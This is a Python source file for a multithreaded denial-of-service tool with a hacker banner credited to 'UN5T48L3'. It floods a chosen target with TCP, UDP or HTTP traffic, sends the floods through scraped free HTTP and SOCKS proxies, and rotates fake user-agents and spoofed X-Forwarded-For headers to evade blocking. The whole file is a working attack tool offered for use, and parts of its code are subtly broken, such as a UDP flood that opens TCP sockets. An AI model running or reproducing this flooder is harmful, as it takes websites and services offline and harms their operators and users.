import argparse
import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys

from bs4 import BeautifulSoup

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # C0d3d by UN5T48L3

if sys.platform.startswith("linux"):  # C0d3d by UN5T48L3
    from scapy.all import *  # C0d3d by UN5T48L3
elif sys.platform.startswith("freebsd"):  # C0d3d by UN5T48L3
    from scapy.all import *  # C0d3d by UN5T48L3
else:  # C0d3d by UN5T48L3
    # C0d3d by UN5T48L3
    print("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.")

print('''

UU   UU NN   NN 555555  TTTTTTT     44    88888  LL      333333  
UU   UU NNN  NN 55        TTT      444   88   88 LL         3333 
UU   UU NN N NN 555555    TTT    44  4    88888  LL        3333  
UU   UU NN  NNN    5555   TTT   44444444 88   88 LL          333 
 UUUUU  NN   NN 555555    TTT      444    88888  LLLLLLL 333333  


							C0d3d by UN5T48L3
	''')  # her nefis bir gün DDoS'u tadacaktır

useragents = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
              "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
              "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
              "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
              "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
              "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
              "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
              "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
              "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", ]


class ArgumentRequiredException(Exception):
    pass


def preprocess_target_url(entered_url: str):  # C0d3d by UN5T48L3
    global url
    global url2
    global urlport

    url = entered_url if entered_url.startswith(
        "http") else f"http://{entered_url}"

    try:
        url2 = url.replace("http://", "").replace("https://",
                                                  "").split("/")[0].split(":")[0]
    except:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

    try:
        urlport = url.replace(
            "http://", "").replace("https://", "").split("/")[0].split(":")[1]
    except:
        urlport = "80"


def preprocess_protocol_selection(protocol, port_input):
    global global_chosen_protocol
    global_chosen_protocol = protocol
    if protocol == "tcp" or protocol == "udp":
        try:
            if os.getuid() != 0:  # C0d3d by UN5T48L3
                # C0d3d by UN5T48L3
                print("You need to run this program as root to use TCP/UDP flooding.")
                exit(0)  # C0d3d by UN5T48L3
            elif port_input:
                global port
                port = port_input
            else:
                raise ArgumentRequiredException(
                    "`--port` argument when using TCP or UDP flooding.")
        except ArgumentRequiredException:
            raise
        except:
            pass


def preprocess_proxy_mode(mode, file, url):
    global global_proxy_mode
    global_proxy_mode = mode
    if mode == "proxy":
        preprocess_proxies_source(file, url)
    elif mode == "socks":
        preprocess_socks_source(file, url)


def preprocess_proxies_source(proxy_file, proxy_url):
    if proxy_file:
        pass
    elif proxy_url == "free-proxy-list":
        fetch_proxies_from_html("http://free-proxy-list.net/")
    else:
        fetch_proxies_from_inforge()


def preprocess_socks_source(socks_file, socks_url):
    if socks_file:
        pass
    elif socks_url == "socks-proxy":
        fetch_proxies_from_html("https://www.socks-proxy.net/")
    else:
        fetch_proxies_from_inforge()

def fetch_proxies_from_html(url):  # C0d3d by UN5T48L3
    try:
        req = urllib.request.Request(("%s") % (url))
        req.add_header("User-Agent", random.choice(useragents))
        sourcecode = urllib.request.urlopen(req)
        part = str(sourcecode.read())
        part = part.split("<tbody>")
        part = part[1].split("</tbody>")
        part = part[0].split("<tr><td>")
        proxies = ""
        for proxy in part:
            proxy = proxy.split("</td><td>")
            try:
                proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        out_file = open("proxy.txt", "w")
        out_file.write("")
        out_file.write(proxies)
        out_file.close()
        print("Proxies downloaded successfully.")
    except:
        print("\nERROR!\n")


def fetch_proxies_from_inforge():
    try:
        if os.path.isfile("proxy.txt"):
            out_file = open("proxy.txt", "w")
            out_file.write("")
            out_file.close()
        else:
            pass
        url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
        soup = BeautifulSoup(urllib.request.urlopen(url))
        print("\nDownloading from inforge.net in progress...")
        base = "https://www.inforge.net/xi/"
        for tag in soup.find_all("a", {"class": "PreviewTooltip"}):
            links = tag.get("href")
            final = base + links
            result = urllib.request.urlopen(final)
            for line in result:
                ip = re.findall(
                    "(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line))
                if ip:
                    for x in ip:
                        out_file = open("proxy.txt", "a")
                        while True:
                            out_file.write(x+"\n")
                            out_file.close()
                            break
        print("Proxies downloaded successfully.")
    except:
        print("\nERROR!\n")


def load_proxies_in_memory(path: str):
    global proxies
    proxies = open(path).readlines()

def load_threads_amount(value: int):
    global threads
    threads = value

def wait_for_confirmation(args):
#    if input(f"Given arguments are: {args}. Press `Enter` to continue and anything else to cancel: ") != "": exit(0)
    pass

def flood():
    global threads
    global get_host
    global acceptall
    global connection
    global go
    global x
    if global_chosen_protocol == "http":
        get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
                     "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
        connection = "Connection: Keep-Alive\r\n"
    x = 0
    go = threading.Event()
    if global_chosen_protocol == "tcp":
        if global_proxy_mode != "default":
            if global_proxy_mode == "proxy":
                for x in range(threads):
                    tcpfloodproxed(x+1).start()
                    print("Thread " + str(x) + " ready!")
                go.set()
            else:
                for x in range(threads):
                    tcpfloodsocked(x+1).start()
                    print("Thread " + str(x) + " ready!")
                go.set()
        else:
            for x in range(threads):
                tcpflood(x+1).start()
                print("Thread " + str(x) + " ready!")
            go.set()
    else:
        if global_chosen_protocol == "udp":
            if global_proxy_mode != "default":
                if global_proxy_mode == "proxy":
                    for x in range(threads):
                        udpfloodproxed(x+1).start()
                        print("Thread " + str(x) + " ready!")
                    go.set()
                else:
                    for x in range(threads):
                        udpfloodsocked(x+1).start()
                        print("Thread " + str(x) + " ready!")
                    go.set()
            else:
                for x in range(threads):
                    udpflood(x+1).start()
                    print("Thread " + str(x) + " ready!")
                go.set()
        else:
            if global_proxy_mode != "default":
                if global_proxy_mode == "proxy":
                    for x in range(threads):
                        requestproxy(x+1).start()
                        print("Thread " + str(x) + " ready!")
                    go.set()
                else:
                    for x in range(threads):
                        requestsocks(x+1).start()
                        print("Thread " + str(x) + " ready!")
                    go.set()
            else:
                for x in range(threads):
                    requestdefault(x+1).start()
                    print("Thread " + str(x) + " ready!")
                go.set()

class tcpfloodproxed(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2)) /
                  TCP(sport=RandShort(), dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(
                    proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print("Request sent from " +
                      str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class tcpfloodsocked(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2)) /
                  TCP(sport=RandShort(), dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(
                    proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print("Request sent from " +
                      str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(
                        proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(url2), int(port)))
                    s.send(p)
                    print("Request sent from " +
                          str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                    try:
                        for y in range(multiple):
                            s.send(str.encode(p))
                    except:
                        s.close()
                except:
                    print("Sock down. Retrying request. @", self.counter)
                    s.close()


class tcpflood(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2)) /
                  TCP(sport=RandShort(), dport=int(port))/data)
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(port)))
                s.send(p)
                print("Request Sent! @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class udpfloodproxed(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(
                    proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print("Request sent from " +
                      str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class udpfloodsocked(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(
                    proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                print("Request sent from " +
                      str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(
                        proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(url2), int(port)))
                    s.send(p)
                    print("Request sent from " +
                          str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                    try:
                        for y in range(multiple):
                            s.send(str.encode(p))
                    except:
                        s.close()
                except:
                    print("Sock down. Retrying request. @", self.counter)
                    s.close()


class udpflood(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(port)))
                s.send(p)
                print("Request Sent! @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(p))
                except:
                    s.close()
            except:
                s.close()


class requestproxy(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
            "." + str(random.randint(0, 255)) + "." + \
            str(random.randint(0, 255))
        forward = "X-Forwarded-For: " + randomip + "\r\n"
        request = get_host + useragent + accept + forward + connection + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy[0]), int(proxy[1])))
                s.send(str.encode(request))
                print("Request sent from " +
                      str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()


class requestsocks(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        request = get_host + useragent + accept + connection + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(
                    proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(urlport)))
                s.send(str.encode(request))
                print("Request sent from " +
                      str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(
                        proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    print("Request sent from " +
                          str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        s.close()
                except:
                    print("Sock down. Retrying request. @", self.counter)
                    s.close()


class requestdefault(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        request = get_host + useragent + accept + connection + "\r\n"
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(urlport)))
                s.send(str.encode(request))
                print("Request sent! @", self.counter)
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

def parse_cli_args(args):
    parser = argparse.ArgumentParser()
    parser.add_argument('--address', '--url', type=str, required=True,
                        help='The address to launch the bombing against.')
    parser.add_argument('--protocol', '--scheme', type=str,
                        choices=['http', 'udp', 'tcp'], default='http')
    parser.add_argument('--mode', type=str,
                        choices=['default', 'proxy', 'socks'], default='proxy')
    parser.add_argument('--port', type=in_range(0, 65535), default=80)
    parser.add_argument('--proxy_or_socks_file', default='proxy.txt')
    parser.add_argument('--proxy_or_socks_url', type=str,
                        choices=['inforge', 'free-proxy-list'], default='inforge')
    parser.add_argument('--threads', type=positive_int, default=800)
    parser.add_argument('--multiplication', type=positive_int, default=100)
    return parser.parse_args(args)

def positive_int(value):
    ivalue = int(value)
    if ivalue <= 0:
        raise argparse.ArgumentTypeError(f"{value} is not positive.")
    return ivalue

def in_range(lower: int, upper: int):
	def internal(value):
		if (value < lower or value > upper): raise argparse.ArgumentError(f"Expected a value in range [{lower}...{upper}] but received {value}.")
		else: return value
	return internal

def main():
    args = parse_cli_args(sys.argv[1:])
    wait_for_confirmation(args)
    preprocess_target_url(args.address)
    preprocess_protocol_selection(args.protocol, args.port)
    preprocess_proxy_mode(args.mode, args.proxy_or_socks_file, args.proxy_or_socks_url)
    load_proxies_in_memory(args.proxy_or_socks_file)
    load_threads_amount(args.threads)
    flood()

if __name__ == "__main__":
    main()
